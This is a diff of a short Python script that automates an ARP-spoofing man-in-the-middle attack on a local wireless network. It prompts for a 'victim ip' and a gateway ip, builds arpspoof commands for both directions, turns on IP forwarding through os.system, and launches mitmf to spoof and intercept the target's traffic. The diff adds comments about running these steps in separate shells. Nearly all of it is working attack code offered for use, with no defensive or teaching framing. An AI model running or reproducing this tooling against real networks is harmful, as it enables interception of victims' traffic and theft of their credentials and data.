@@ -17,13 +17,16 @@ the assHole productions
 target = (input("what's the victim ip?"))
 gatew = (input("what'S the gateway ip?"))
 
-
+# want this line to run and open on a new shell (it will run without stopping anyway)
 print("arpspoof -i wlan1 -t {0} {1}".format(target,gatew))
+# want this line to run and open on a new shell (it will run without stopping anyway)
 print("arpspoof -i wlan1 -t {0} {1}".format(gatew,target))
 idle = (input("press when ready for echo"))
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
 idle1 = (input("press when ready for MITMF"))
 
+# want this line to run and open on a new shell (it will run another software)
 os.system("mitmf --arp --spoof --gateway {0} --target {1} -i wlan1".format(gatew,target))
 
 
